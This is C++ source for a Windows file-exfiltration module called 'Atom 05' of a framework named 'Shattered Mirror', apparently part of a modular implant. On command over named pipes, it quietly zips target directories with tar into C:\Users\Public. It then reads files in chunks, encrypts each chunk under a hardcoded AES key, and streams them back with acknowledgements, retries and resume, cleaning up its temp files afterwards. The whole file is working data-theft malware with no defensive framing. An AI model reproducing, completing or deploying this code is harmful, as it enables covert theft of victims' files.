/*=============================================================================
 * Shattered Mirror v1 — Atom 05: File Exfiltration
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports and chunked file data on report pipe.
 *===========================================================================*/

#include "Atom_05_Exfil.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <bcrypt.h>
#include <cstdarg>
#include <cstdio>
#include <cstring>
#include <string>

#pragma comment(lib, "bcrypt.lib")

#define CHUNK_SIZE 4096
#define MAX_RETRIES 5

typedef struct _EXFIL_HEADER {
  DWORD dwSequence;
  DWORD dwChunkLen;
  BYTE IV[12];
  BYTE Tag[16];
} EXFIL_HEADER;

static void ExfilDebug(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\exfil_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
  printf("%s\n", buf);
}

static void SendErrorReport(HANDLE hReportPipe, const char *errorMsg,
                            BYTE *sessionKey, DWORD dwAtomId) {
  IPC_MESSAGE metaMsg = {0};
  metaMsg.dwSignature = 0x534D4952;
  metaMsg.CommandId = CMD_FORWARD_REPORT;
  metaMsg.AtomId = dwAtomId;
  metaMsg.dwPayloadLen = (DWORD)strlen(errorMsg);
  memcpy(metaMsg.Payload, errorMsg, metaMsg.dwPayloadLen);
  IPC_SendMessage(hReportPipe, &metaMsg, sessionKey, 16);
  ExfilDebug("Sent error: %s", errorMsg);
}

BOOL AesGcmEncrypt(const BYTE *pKey, const BYTE *pIv, const BYTE *pPlaintext,
                   DWORD dwPlainLen, BYTE *pCiphertext, BYTE *pTag) {
  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCRYPT_KEY_HANDLE hKey = NULL;
  NTSTATUS status;

  status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(status))
    return FALSE;

  status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                             (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                             sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
  if (!NT_SUCCESS(status)) {
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return FALSE;
  }

  status =
      BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, 32, 0);
  if (!NT_SUCCESS(status)) {
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return FALSE;
  }

  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
  BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
  authInfo.pbNonce = (PUCHAR)pIv;
  authInfo.cbNonce = 12;
  authInfo.pbTag = pTag;
  authInfo.cbTag = 16;

  DWORD cbResult = 0;
  status = BCryptEncrypt(hKey, (PUCHAR)pPlaintext, dwPlainLen, &authInfo, NULL,
                         0, pCiphertext, dwPlainLen, &cbResult, 0);

  BCryptDestroyKey(hKey);
  BCryptCloseAlgorithmProvider(hAlg, 0);
  return NT_SUCCESS(status);
}

static void GenerateRandomIV(BYTE *iv, DWORD ivLen) {
  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0);
  if (hAlg) {
    BCryptGenRandom(hAlg, iv, ivLen, 0);
    BCryptCloseAlgorithmProvider(hAlg, 0);
  } else {
    for (DWORD i = 0; i < ivLen; i++)
      iv[i] = (BYTE)(GetTickCount() + i);
  }
}

static BOOL WaitForAck(HANDLE hCmdPipe, DWORD expectedSeq, BYTE *sessionKey) {
  IPC_MESSAGE inMsg;
  DWORD startTick = GetTickCount();
  while ((GetTickCount() - startTick) < 10000) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, sessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string payload((char *)inMsg.Payload, inMsg.dwPayloadLen);
          if (payload.find("ACK:") == 0) {
            DWORD ackSeq = atoi(payload.c_str() + 4);
            if (ackSeq == expectedSeq)
              return TRUE;
          }
        }
      }
    }
    Sleep(100);
  }
  return FALSE;
}

DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
  ExfilDebug("=== Atom 05 RAW PIPE VERSION ===");

  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;

  // 1. Connect to command pipe (receive commands and ACKs)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    ExfilDebug("[Atom 5] FATAL: IPC_ConnectToCommandPipe failed. Error: %lu",
               GetLastError());
    return 1;
  }
  ExfilDebug("[Atom 5] Connected to command pipe. Handle: %p", hCmdPipe);

  // 2. Connect to report pipe (send reports and file chunks)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    ExfilDebug("[Atom 5] FATAL: IPC_ConnectToReportPipe failed. Error: %lu",
               GetLastError());
    CloseHandle(hCmdPipe);
    return 1;
  }
  ExfilDebug("[Atom 5] Connected to report pipe. Handle: %p", hReportPipe);

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  BYTE AesExfilKey[32];
  const char *keyMaterial = "MySuperSecretAes256KeyForExfil!!";
  memcpy(AesExfilKey, keyMaterial, 32);

  // Send CMD_READY on report pipe
  if (hReportPipe) {
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    readyMsg.dwPayloadLen = 0;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  }
  ExfilDebug("[Atom 5] CMD_READY sent.");

  ExfilDebug("[Atom 5] Waiting for CMD_EXECUTE...");

  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string filePath((char *)inMsg.Payload, inMsg.dwPayloadLen);
          ExfilDebug("[Atom 5] Received CMD_EXECUTE: %s", filePath.c_str());

          // Validate path
          DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
          if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
              ExfilDebug("[Atom 5] Invalid file path: %s", filePath.c_str());
              continue;
          }

          if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
              if (inMsg.Payload[0] == 'Z') { // ZIP command
                  ExfilDebug("[Atom 5] Target is a directory. Zipping...");
                  char szTempZip[MAX_PATH];
                  sprintf_s(szTempZip, "C:\\Users\\Public\\%lu.tmp", GetTickCount());
                  
                  // Use native 'tar' (available in Win10/11) for stealthy zipping
                  char szCmd[1024];
                  sprintf_s(szCmd, "tar -acf \"%s\" -C \"%s\" .", szTempZip, filePath.c_str());
                  
                  STARTUPINFOA si = { sizeof(si) };
                  PROCESS_INFORMATION pi = { 0 };
                  if (CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                      WaitForSingleObject(pi.hProcess, 60000); // 1 min timeout
                      CloseHandle(pi.hProcess);
                      CloseHandle(pi.hThread);
                      filePath = szTempZip; // Point exfil to the new zip
                      ExfilDebug("[Atom 5] Zip created: %s", szTempZip);
                  } else {
                      SendErrorReport(hReportPipe, "[EXFIL] ERROR: Failed to create zip.", SharedSessionKey, dwAtomId);
                      continue;
                  }
              } else {
                  ExfilDebug("[Atom 5] Path is a directory. Waiting for ZIP confirmation.");
                  SendErrorReport(hReportPipe, "[EXFIL_DIR_DETECTED]", SharedSessionKey, dwAtomId);
                  continue;
              }
          }

          HANDLE hFile =
              CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
          if (hFile == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            ExfilDebug("[Atom 5] Cannot open file. Error: %lu", err);
            char errMsg[128];
            sprintf_s(errMsg, "[EXFIL] ERROR: Cannot open file (code %lu)",
                      err);
            SendErrorReport(hReportPipe, errMsg, SharedSessionKey, dwAtomId);
            continue;
          }

          DWORD dwStartChunk = 0;
          if (inMsg.Payload[0] == 'R') { // Format: RESUME:[CHUNK_NUM]:[PATH]
              char szPathBuf[MAX_PATH] = {0};
              if (sscanf_s((char*)inMsg.Payload, "RESUME:%lu:%s", &dwStartChunk, szPathBuf, (unsigned)_countof(szPathBuf)) >= 2) {
                  filePath = szPathBuf;
              }
          }

          DWORD dwFileSize = GetFileSize(hFile, NULL);
          DWORD totalChunks = (dwFileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
          ExfilDebug("[Atom 5] File size: %lu bytes, %lu chunks (Starting at %lu)", dwFileSize, totalChunks, dwStartChunk);

          // Send META on report pipe
          std::string meta =
              "META:" + filePath + ":" + std::to_string(totalChunks);
          IPC_MESSAGE msg = {0};
          msg.dwSignature = 0x534D4952;
          msg.CommandId = CMD_FORWARD_REPORT;
          msg.AtomId = dwAtomId;
          msg.dwPayloadLen = (DWORD)meta.length();
          memcpy(msg.Payload, meta.c_str(), meta.length());
          IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
          ExfilDebug("[Atom 5] META sent: %s", meta.c_str());

          BYTE plainBuf[CHUNK_SIZE];
          DWORD dwBytesRead, dwSequence = dwStartChunk, dwTotalSent = (dwStartChunk * CHUNK_SIZE);

          while (dwSequence < totalChunks) {
            DWORD bytesToRead = (dwSequence == totalChunks - 1)
                                    ? (dwFileSize - (dwSequence * CHUNK_SIZE))
                                    : CHUNK_SIZE;
            SetFilePointer(hFile, dwSequence * CHUNK_SIZE, NULL, FILE_BEGIN);
            if (!ReadFile(hFile, plainBuf, bytesToRead, &dwBytesRead, NULL) ||
                dwBytesRead == 0)
              break;

            EXFIL_HEADER header;
            header.dwSequence = dwSequence;
            header.dwChunkLen = dwBytesRead;
            GenerateRandomIV(header.IV, sizeof(header.IV));

            BYTE cipherBuf[CHUNK_SIZE];
            if (!AesGcmEncrypt(AesExfilKey, header.IV, plainBuf, dwBytesRead,
                               cipherBuf, header.Tag))
              break;

            IPC_MESSAGE outMsg = {0};
            outMsg.dwSignature = 0x534D4952;
            outMsg.CommandId = CMD_FORWARD_REPORT;
            outMsg.AtomId = dwAtomId;
            DWORD msgSize = sizeof(header) + dwBytesRead;
            outMsg.dwPayloadLen = msgSize;
            memcpy(outMsg.Payload, &header, sizeof(header));
            memcpy(outMsg.Payload + sizeof(header), cipherBuf, dwBytesRead);

            BOOL acked = FALSE;
            for (int retry = 0; retry < MAX_RETRIES; retry++) {
              if (IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey,
                                  16)) {
                if (WaitForAck(hCmdPipe, dwSequence, SharedSessionKey)) {
                  acked = TRUE;
                  dwTotalSent += dwBytesRead;
                  ExfilDebug("[Atom 5] Chunk %lu ACKed", dwSequence);
                  break;
                }
              } else {
                ExfilDebug(
                    "[Atom 5] IPC_SendMessage failed for chunk %lu",
                    dwSequence);
              }
              Sleep(1000);
            }
            if (!acked) {
              ExfilDebug("[Atom 5] Failed to get ACK for chunk %lu after %d "
                         "retries. Aborting.",
                         dwSequence, MAX_RETRIES);
              break;
            }
            dwSequence++;
          }
          CloseHandle(hFile);

          // Cleanup temp zip if we made one
          if (filePath.find("C:\\Users\\Public\\") == 0 && filePath.find(".tmp") != std::string::npos) {
              DeleteFileA(filePath.c_str());
              ExfilDebug("[Atom 5] Cleaned up temp zip.");
          }

          std::string done = "DONE:" + std::to_string(dwTotalSent);
          IPC_MESSAGE doneMsg = {0};
          doneMsg.dwSignature = 0x534D4952;
          doneMsg.CommandId = CMD_REPORT;
          doneMsg.dwPayloadLen = (DWORD)done.length();
          memcpy(doneMsg.Payload, done.c_str(), done.length());
          IPC_SendMessage(hReportPipe, &doneMsg, SharedSessionKey, 16);
          ExfilDebug("[Atom 5] Transfer finished. Sent %lu bytes", dwTotalSent);
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          ExfilDebug("[Atom 5] Received CMD_TERMINATE. Exiting.");
          break;
        }
      }
    } else {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE)
        break;
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}